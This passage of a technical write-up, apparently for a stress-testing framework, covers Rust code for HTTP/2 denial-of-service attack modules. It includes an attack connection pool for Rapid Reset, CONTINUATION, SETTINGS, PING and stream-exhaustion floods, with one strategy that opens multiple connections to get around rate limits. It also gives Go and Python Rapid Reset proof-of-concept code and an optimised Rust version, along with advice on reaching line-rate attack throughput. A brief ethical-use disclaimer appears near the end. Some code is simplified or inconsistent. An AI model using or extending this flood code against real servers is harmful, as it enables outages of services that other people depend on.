        "server" => Some(54),
        "set-cookie" => Some(55),
        "strict-transport-security" => Some(56),
        "transfer-encoding" => Some(57),
        "user-agent" => Some(58),
        "vary" => Some(59),
        "via" => Some(60),
        "www-authenticate" => Some(61),
        _ => None,
    }
}
```

## 9. Connection Management for Attacks

### Connection Strategy per Attack Type

```rust
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::net::{TcpStream, SocketAddr};
use std::time::{Duration, Instant};

struct AttackConnectionPool {
    connections: Arc<Mutex<HashMap<SocketAddr, Vec<TcpStream>>>>,
    max_connections_per_target: usize,
    connection_timeout: Duration,
}

impl AttackConnectionPool {
    pub fn new(max_connections: usize, timeout: Duration) -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
            max_connections_per_target: max_connections,
            connection_timeout: timeout,
        }
    }
    
    /// Get connection for specific attack type
    pub fn get_connection(&self, target: &SocketAddr, attack_type: AttackType) -> io::Result<TcpStream> {
        let mut conns = self.connections.lock().unwrap();
        
        let target_conns = conns.entry(*target).or_insert_with(Vec::new);
        
        // Clean up dead connections
        target_conns.retain(|conn| {
            match conn.peer_addr() {
                Ok(_) => true,
                Err(_) => false,
            }
        });
        
        // Strategy based on attack type
        match attack_type {
            AttackType::RapidReset => {
                // Rapid Reset: single connection, high reuse
                if target_conns.is_empty() {
                    let stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
                    perform_http2_handshake(&stream)?;
                    target_conns.push(stream);
                }
                Ok(target_conns[0].try_clone()?)
            }
            
            AttackType::ContinuationFlood => {
                // CONTINUATION: one connection per target
                if target_conns.is_empty() {
                    let stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
                    perform_http2_handshake(&stream)?;
                    target_conns.push(stream);
                }
                Ok(target_conns[0].try_clone()?)
            }
            
            AttackType::SettingsFlood => {
                // SETTINGS: multiple connections to bypass rate limits
                if target_conns.len() < self.max_connections_per_target {
                    let stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
                    perform_http2_handshake(&stream)?;
                    let cloned = stream.try_clone()?;
                    target_conns.push(stream);
                    Ok(cloned)
                } else {
                    // Round-robin through existing connections
                    let index = target_conns.len() % self.max_connections_per_target;
                    Ok(target_conns[index].try_clone()?)
                }
            }
            
            AttackType::StreamExhaustion => {
                // Stream exhaustion: one connection, hold it open
                if target_conns.is_empty() {
                    let stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
                    perform_http2_handshake(&stream)?;
                    target_conns.push(stream);
                }
                Ok(target_conns[0].try_clone()?)
            }
            
            AttackType::PingFlood => {
                // PING: moderate number of connections
                let desired_connections = 10.min(self.max_connections_per_target);
                if target_conns.len() < desired_connections {
                    let stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
                    perform_http2_handshake(&stream)?;
                    let cloned = stream.try_clone()?;
                    target_conns.push(stream);
                    Ok(cloned)
                } else {
                    let index = rand::random::<usize>() % desired_connections;
                    Ok(target_conns[index].try_clone()?)
                }
            }
        }
    }
    
    /// Handle GOAWAY frames - reconnect
    pub fn handle_goaway(&self, target: &SocketAddr, stream: &TcpStream) -> io::Result<()> {
        let mut conns = self.connections.lock().unwrap();
        
        if let Some(target_conns) = conns.get_mut(target) {
            // Remove the closed connection
            target_conns.retain(|conn| {
                match conn.peer_addr() {
                    Ok(addr) => addr != stream.peer_addr().unwrap(),
                    Err(_) => false,
                }
            });
            
            // Create new connection
            let new_stream = TcpStream::connect_timeout(target, self.connection_timeout)?;
            perform_http2_handshake(&new_stream)?;
            target_conns.push(new_stream);
        }
        
        Ok(())
    }
}

#[derive(Debug, Clone, Copy)]
enum AttackType {
    RapidReset,
    ContinuationFlood,
    SettingsFlood,
    PingFlood,
    StreamExhaustion,
    HpackBomb,
}

/// Perform HTTP/2 handshake (simplified)
fn perform_http2_handshake(stream: &TcpStream) -> io::Result<()> {
    let mut stream = stream.try_clone()?;
    
    // Send connection preface
    let preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    stream.write_all(preface)?;
    
    // Send initial SETTINGS frame
    let settings = build_settings_frame(&[
        (0x01, 4096),   // HEADER_TABLE_SIZE
        (0x02, 100),    // ENABLE_PUSH
        (0x03, 100),    // MAX_CONCURRENT_STREAMS
        (0x04, 65535),  // INITIAL_WINDOW_SIZE
        (0x05, 16384),  // MAX_FRAME_SIZE
        (0x06, 16384),  // MAX_HEADER_LIST_SIZE
    ]);
    stream.write_all(&settings)?;
    
    // Read server SETTINGS
    let mut buf = [0u8; 9];
    stream.read_exact(&mut buf)?;
    
    // Send SETTINGS ACK
    let settings_ack = build_settings_frame(&[], true);
    stream.write_all(&settings_ack)?;
    
    Ok(())
}
```

## 10. Real PoC Code Analysis and Translation

### Analysis of Existing Rapid Reset Implementations

**Go Implementation (from rapidresetclient):**
```go
func rapidReset(conn net.Conn, host string, count int) error {
    // Send HTTP/2 preface
    conn.Write([]byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"))
    
    // Send SETTINGS
    settings := buildSettingsFrame()
    conn.Write(settings)
    
    for i := 0; i < count; i++ {
        streamID := uint32(2*i + 1)
        
        // HEADERS frame
        headers := buildHeadersFrame(streamID, host, "/")
        conn.Write(headers)
        
        // RST_STREAM immediately
        rst := buildRstStreamFrame(streamID)
        conn.Write(rst)
    }
    
    return nil
}
```

**Python Implementation:**
```python
def rapid_reset_attack(target, port, num_requests):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # HTTP/2 preface
    sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
    
    stream_id = 1
    for _ in range(num_requests):
        # Build HEADERS
        headers = build_headers_frame(stream_id)
        sock.send(headers)
        
        # Build RST_STREAM
        rst = build_rst_frame(stream_id)
        sock.send(rst)
        
        stream_id += 2
```

### Key Insights for Rust Translation

1. **Performance**: Rust can achieve higher throughput due to zero-cost abstractions
2. **Memory Safety**: Rust prevents buffer overflows in frame construction
3. **Concurrency**: Rust's async/await enables high connection counts
4. **Batching**: Use `writev()` or `sendmmsg()` for batch sending

### Rust Translation with Performance Optimizations

```rust
use std::os::unix::io::AsRawFd;
use libc::{sendmmsg, mmsghdr, iovec, sockaddr_in};

/// High-performance batch sending using sendmmsg()
fn send_frames_batch(fd: i32, frames: &[&[u8]], target: &SocketAddr) -> io::Result<usize> {
    unsafe {
        let mut msgs = Vec::with_capacity(frames.len());
        let addr: sockaddr_in = std::mem::zeroed(); // Simplified
        
        for frame in frames {
            let mut iov = iovec {
                iov_base: frame.as_ptr() as *mut _,
                iov_len: frame.len(),
            };
            
            let mut msg = mmsghdr {
                msg_hdr: libc::msghdr {
                    msg_name: &addr as *const _ as *mut _,
                    msg_namelen: std::mem::size_of::<sockaddr_in>() as u32,
                    msg_iov: &mut iov,
                    msg_iovlen: 1,
                    msg_control: std::ptr::null_mut(),
                    msg_controllen: 0,
                    msg_flags: 0,
                },
                msg_len: 0,
            };
            
            msgs.push(msg);
        }
        
        let sent = sendmmsg(fd, msgs.as_mut_ptr(), frames.len() as u32, 0);
        if sent == -1 {
            return Err(io::Error::last_os_error());
        }
        
        Ok(sent as usize)
    }
}

/// Async version using tokio
async fn rapid_reset_async(target: SocketAddr, duration: Duration) -> io::Result<u64> {
    use tokio::net::TcpStream;
    use tokio::time::{sleep, Instant};
    
    let mut stream = TcpStream::connect(&target).await?;
    perform_http2_handshake_async(&mut stream).await?;
    
    let start = Instant::now();
    let mut request_count = 0u64;
    let mut stream_id = 1u32;
    
    // Pre-build frames for maximum speed
    let mut frames = Vec::new();
    for _ in 0..1000 {
        let headers = build_headers_frame(stream_id);
        let rst = build_rst_frame(stream_id);
        frames.push(headers);
        frames.push(rst);
        stream_id += 2;
    }
    
    while start.elapsed() < duration {
        // Send batch asynchronously
        for frame in &frames {
            stream.write_all(frame).await?;
        }
        request_count += 1000;
        
        // Yield to avoid blocking
        sleep(Duration::from_micros(1)).await;
    }
    
    Ok(request_count)
}
```

## Performance Benchmarks and Theoretical Limits

### Attack Type Performance Characteristics

| Attack Type | Connections | Streams/Conn | Bytes/Req | Max RPS (10Gbps) | Memory Impact |
|-------------|------------|--------------|-----------|------------------|---------------|
| Rapid Reset | 1-10 | Unlimited | 48 | 1.04M | Low |
| CONTINUATION | 1 | 1 | 16KB/frame | 6.1K | High |
| SETTINGS Flood | 100-1000 | N/A | 30 | 3.33M | Low |
| PING Flood | 10-100 | N/A | 17 | 1.47M | Low |
| Stream Exhaustion | 1 | 100-1000 | 1KB | N/A | Medium |
| HPACK Bomb | 1-10 | 1 | 1KB→1MB | 10K | Very High |

### Optimization Techniques

1. **Kernel Bypass**: Use DPDK or XDP for line-rate packet processing
2. **Batch Processing**: Group frames into larger TCP packets
3. **Connection Pooling**: Reuse connections to avoid handshake overhead
4. **Zero-copy**: Use `Bytes` crate for zero-copy buffer management
5. **Async I/O**: Use `tokio` or `async-std` for high concurrency

## Implementation Checklist for Phoenix Framework

### Core Requirements
- [ ] Raw HTTP/2 frame construction library
- [ ] HPACK encoder/decoder
- [ ] Connection pool management
- [ ] Attack module interface
- [ ] Statistics collection
- [ ] Rate limiting and backpressure
- [ ] TLS support (optional)

### Attack Modules to Implement
- [ ] Rapid Reset (CVE-2023-44487)
- [ ] CONTINUATION Flood
- [ ] HPACK Bomb
- [ ] SETTINGS Flood
- [ ] PING Flood
- [ ] Stream Exhaustion
- [ ] Legitimate Load Testing
- [ ] Mixed attack patterns

### Testing Requirements
- [ ] Unit tests for frame construction
- [ ] Integration tests with real HTTP/2 servers
- [ ] Performance benchmarks
- [ ] Memory safety validation
- [ ] Fuzz testing for edge cases

## Security Considerations

1. **Ethical Use**: These modules are for security testing only
2. **Rate Limiting**: Implement configurable rate limits
3. **Target Validation**: Verify targets are authorized for testing
4. **Legal Compliance**: Follow applicable laws and regulations
5. **Disclosure**: Report vulnerabilities responsibly

## Conclusion

Implementing HTTP/2 attack modules in Rust at the raw frame level provides:
- Maximum performance through zero-cost abstractions
- Memory safety guarantees
- Fine-grained control over attack patterns
- Accurate simulation of real-world attacks

The Phoenix framework can leverage Rust's performance characteristics to create the most effective HTTP/2 stress testing tool available, capable of generating attacks at line rate while maintaining precise control over attack parameters.

## References

1. RFC 7540 - HTTP/2 Specification
2. RFC 7541 - HPACK: Header Compression for HTTP/2
3. CVE-2023-44487 - HTTP/2 Rapid Reset Vulnerability
4. Cloudflare Technical Breakdown of Rapid Reset
5. Google Cloud Analysis of HTTP/2 DDoS Attacks
6. CERT/CC Vulnerability Note VU#421644 (CONTINUATION Flood)
7. nghttp2 Library Source Code
8. Go HTTP/2 Implementation (net/http package)
9. Node.js http2 Module Source
10. Apache httpd mod_http2 Implementation

